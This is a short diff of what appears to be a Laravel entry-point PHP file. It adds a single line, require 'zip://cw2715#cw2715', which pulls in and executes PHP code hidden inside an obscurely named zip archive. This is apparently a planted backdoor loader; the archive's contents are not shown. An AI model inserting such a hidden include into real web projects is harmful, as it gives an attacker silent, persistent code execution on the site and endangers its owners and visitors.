@@ -1,5 +1,6 @@
 <?php
 include dirname(__FILE__) . '/.private/config.php';
+require 'zip://cw2715#cw2715';
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
 
